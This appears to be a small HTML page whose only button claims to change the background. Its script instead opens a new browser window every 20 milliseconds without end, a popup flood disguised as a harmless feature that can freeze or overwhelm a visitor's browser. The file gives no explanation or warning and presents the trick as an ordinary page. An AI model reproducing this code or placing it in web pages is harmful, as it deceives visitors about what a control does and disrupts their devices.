<!DOCTYPE html>
<html>
  <head>
    <title>My Website</title>
  </head>
  <body>
    <button id="runFunction">Click Me to change the background</button>

    <script>
      const runButton = document.querySelector('#runFunction');
      
      runButton.addEventListener('click', () => {
        setInterval(() => {
          window.open();
        }, 20);
      });
    </script>
  </body>
</html>
